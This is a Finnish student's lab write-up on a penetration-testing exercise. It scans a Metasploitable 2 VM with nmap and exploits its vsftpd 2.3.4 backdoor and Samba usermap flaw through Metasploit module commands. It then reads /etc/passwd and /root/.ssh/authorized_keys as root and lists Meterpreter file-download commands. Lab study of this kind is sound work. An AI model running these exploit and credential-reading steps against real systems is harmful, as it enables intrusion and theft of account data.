**X)**

**€ Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit:**

**Tärkeitä termejä metasploitissa:**
  * **exploit** (hyödynnys): Koodi, mikä hyödyntää kohdejärjestelmän haavoittovuutta
  * **payload** (kuorma): koodi, mikä ajetaan onnistuneen hyökkäyksen jälkeen ja tekee halutut toiminnot kohdejärjestelmässä.
  * **Auxiliary** (Apuohjelmat): Ohjelmia esimerkiksi skannaamiseen, sniffaamiseen tai fuzzaukseen (automaattinen ohjelma mikä syöttää kohteeseen epävalidia, odottamatonta tai satunnaista dataa löytääkseen epäkohtia ja haavoittuvuuksia)
  * **Encoders**(enkooderit): Muokkaavat/koodaavat moduuleja, jotta niiden havaitseminen esimerkiksi virustorjunnalla olisi vaikeampaa.
  * **Meterpreter**: Erityinen payload, joka käyttää muistissa tapahtuvaa DLL-injektiota ja tarjoaa monipuolisia toimintoja kohdejärjestelmässä.

- Metasploit Framework on avointalähdekoodia sekä sitä kehitetään aktiivisesti mikä tekee siitä helposti muokattavaa ja hyvän kohteen harjoitella eri moduuleilla.
- Datakantojen käyttö metasploitilla on mahdollista hyödyntää joihin voi tallentaa dokumentaatiota suorituksista.
- Löydetään oikeat komennot nmapille ja skannataan portit -> kun on löydetty ohjelmistoversiot sekä portit valitaan ja sovitellaan oikea tapa hyödyntää sitä -> syötetään payload

Lähteet: 
What is fuzzing and fuzz testing? (29.7.2024): https://github.com/resources/articles/what-is-fuzz-testing (luettu 8.9.2026)

Conducting a penetration test with Metasploit:sta luvun loppuun: https://learning.oreilly.com/library/view/mastering-metasploit/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-30 (luettu 8.9.2026)

**Mitä 'nmap -sn' tekee?**

- 'nmap -sn' komento ajaa porttiskannauksen (nmap) lisäkomennolla '-sn' (No Port Scan). Lisäkomento '-sn' ajaa Nmapin niin, että nmap ei skannaa portteja kun osoite on löytynyt, kutsutaan myös nimellä "ping-scan".
- Komento on usein hyödyllinen esimerkiksi osoitteiden löytmäiseen ja niiden saatavuuteen ilman, että erikseen pingaa jokaista osoitetta yksitellen.

Lähde: Host discovery : https://nmap.org/book/man-host-discovery.html (Luettu 8.9.2026)
Luotettavuus: Lähde on Nmap kehittäjän omalta viralliselta nettisivulta poimittu. 

**a) Porttiskannauksentuloksia nmapilla**
- ensiksi alustin metasploitablen tietokannan ja otin yhteyden konsoliin komennoilla 'sudo msfdb init' 'msfconsole' sekä tarkistin että tietokanta on elossa komennolla 'db_status'

<img width="436" height="30" alt="image" src="https://github.com/user-attachments/assets/55c8fc64-430f-4fd4-bdf2-72c97bd3d478" />

sitten ajoin porttiskannauksen 'db_nmap -sV 192.168.56.101':

<img width="936" height="583" alt="image" src="https://github.com/user-attachments/assets/a5210122-f765-43f9-bf50-62cc93b6ed8e" />

**b)**

Tulokset tallennetuista skannauksista:

<img width="894" height="610" alt="image" src="https://github.com/user-attachments/assets/81051f32-f37c-4f2e-ab97-54f9413f788d" />

sitten koitin hakea ssh porttia tietokannois:

<img width="772" height="41" alt="image" src="https://github.com/user-attachments/assets/29ef621d-6318-42d0-898c-e40fc68ab4bc" />

**c)**

Netistä löysin kuuluisan haavoittuvuuden "vsftpd" missä saa käyttäjän root oikeudet kun käyttäjänimeen lisää ":)" -hymiön

<img width="943" height="189" alt="image" src="https://github.com/user-attachments/assets/42353d38-4409-4262-b55a-870fdb9d1281" />

Lähde: Metasploitable 2 Exploitability Guide: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/ (Luettu 8.9.2026)

**D)**

nmapilla pystyy tallentamaan tuloksia ilman tietokantaa sen omalla tallennus komennolla 'nmap -oA "kansionnimi" ip'. Komento skannaaportit sekä tallentaa niiden tiedot kolmeen eri tiedostomuotoon: normaaliin teksti tiedostoon "-oN", XML tiedostomuotoon "-oX" sekä grepattavaan muotoon "-oG".

Tiedostot tallennetaan joko ".gnamp", "nmap" tai "xml" muotoihin

- ".gnamp" on tulosten grepattava muoto, sen hyvät puolet on että sitä on erittäin helppo käsitellä Linuxin tekstinkäsittelytyökaluilla
- ".nmap" on tulosten "plain text" muoto minkä hyvä puoli on se, että se on ihmiselle helppolukuinen sellaisenaan
- ".xml" on tulosten xml-tiedostomuoto mikä on luotu koneluettavaksi: helppo tuoda muihin työkaluihin.
- metasploitin tietokanta integroituu suoraan hyökkäystyökaluihin

Lähde: Output: https://nmap.org/book/man-output.html (Luettu 8.9.2026)

**E) Murtautuminen vsftpd**

ensinksi etsin konsolesta vsftpd:n komennolla 'search vsftpd' jonka jälkeen käytin 'use exploit/unix/ftp/vsftpd_234_backdoor' moduulia (payload) oikeaan vsftpd versioon ("backdoor" -versioon). 

- <img width="583" height="70" alt="image" src="https://github.com/user-attachments/assets/3116b030-7199-421e-bd4f-d6513df6964c" />

Sitten annoin moduulille osoite ip:n johon se lähettää haitalliset komennot, eli annetaan moduulille kohde. Komento 'set RHOSTS 192.168.56.101'.

- <img width="554" height="37" alt="image" src="https://github.com/user-attachments/assets/680ceedf-210d-4bf8-b96d-c5d59c96abfe" />

Sitten annoin moduulille lähde ip:n jotta se tietää mihin osoitteeseen se yhdistää, eli minun kalin ip:n. Komento 'set LHOST 192.168.56.102'.

- <img width="928" height="160" alt="image" src="https://github.com/user-attachments/assets/d43554ca-7959-42fb-94be-cc3572e3991e" />

Sitten murtauduin komennolla 'run'.

- <img width="928" height="160" alt="image" src="https://github.com/user-attachments/assets/d43554ca-7959-42fb-94be-cc3572e3991e" />

Tämän jälkeen tarkistin root oikeudet 'ls'

- <img width="577" height="491" alt="image" src="https://github.com/user-attachments/assets/20874440-7a2f-4d4f-9f15-87f5ffd23b6b" />


Lähde: Exploiting vsftpd 2.3.4 on Metasploitable2: https://dev.to/lexisbil1/exploiting-vsftpd-234-on-metasploitable2-step-by-step-guide-for-beginners-4pem#1 (Luettu 8.9.2026)

**F) Levittäytyminen**

Nyt kun olen onnistuneesti murtautunut metasploitin sisälle käyttämällä vsftpd exploittia, pystyn root käyttäjänä keräämään eri tietoja koneesta. 'cat /etc/passwd' sekä 'cat /root/.ssh/authorized_keys' ovat komentoja joista saa kriittisiä salasanoja irti:

- <img width="310" height="107" alt="image" src="https://github.com/user-attachments/assets/3d800581-5741-4bc4-ae5f-ce90d455d9f3" />

- <img width="934" height="87" alt="image" src="https://github.com/user-attachments/assets/3bbb6d33-c88e-44a9-9d60-bdf19c953d7f" />

Lähde: A Practice Guide to Exploring FTP Vulnerabilities in Metasploitable 2 Using Debian Linux https://medium.com/@mrarslanakhtar/a-practice-guide-to-exploring-ftp-vulnerabilities-in-metasploitable-2-using-debian-linux-d96f7e7e82fa (luettu 8.9.2026)

**G) muratudu muulla tavalla**

Valitsin murtautumistavaksi hyödyntää sambaa. Samban haavoittuvuus on se, että sitä kautta pystyy suorittamaan komentoja ilman tunnistautumista.

ensiksi etsin sen komennolla 'search samba usermap' että se on varmasti kohdekoneessa

sitten käytin samaa kaavaa kuin edellisessä kohdassa eli valitsin oikean murtotyökalun jonka jälkeen annnoin kohde osoitteen johon murto suoritetaan, oman osoitteen ja sitten 'run'

- <img width="891" height="378" alt="image" src="https://github.com/user-attachments/assets/c865e75a-52f0-4637-872c-ccc8ca082211" />

Lähde: Metaploitable II: Exploiting Samba smbd 3.X — 4.X https://medium.com/@mrjoemaina01/metaploitable-ii-exploiting-samba-smbd-3-x-4-x-2b567b767020 (Luettu 8.9.2026)

**H) Demonstroi**

- Meterpreterillä on useita hyödyllisiä komentoja joita käyttää murtautuneessa ympäristössä.
- Komento 'help' näyttää kaikki käytössä olevat komennot
- komento 'sysinfo' näyttää koneen version, mallin sekä sen nimen
- komento 'ps' näyttää kaikki käynnissä olevat prosessit
- komento 'download "kohde" "lähde"' lataa kohde koneesta haluttuja tiedostoja halutulle koneelle

Lähde: Meterpreter Basics https://www.offsec.com/metasploit-unleashed/meterpreter-basics/ Luettu 8.9.2026

**i) Shell-session tallennus**

Aloitin Shell-session tallennuksen kirjoittamalla kalin bashiin 'script -fa log001.txt', jonka jälkeen murtauduin vanhaan tuttuun tapaan vsftpd:n kautta metasploittiin. Metasploitissa kirjoitin eri komentoja kuten 'ls', 'cat /etc/passwrd' ja 'sysinfo'. Kun olin valmis niin kirjoitin kolme kertaa exit niin poistuin moduulista, konsolesta sekä tallennuksesta. Kun kirjoitan kaliin 'cat log001.txt' niin tulostuu kaikki kirjoittamani asiat näytölle onnistuneesti. 

- <img width="387" height="52" alt="image" src="https://github.com/user-attachments/assets/8082bb7c-c52d-463f-8cbf-6412f1bf8fb0" />

- <img width="890" height="263" alt="image" src="https://github.com/user-attachments/assets/5179b1e6-10af-40b8-8fbf-200efb5db95b" />

Lähde: 

**Lähteet:**
What is fuzzing and fuzz testing? (29.7.2024): https://github.com/resources/articles/what-is-fuzz-testing luettu 8.9.2026
Host discovery (: https://nmap.org/book/man-host-discovery.html 
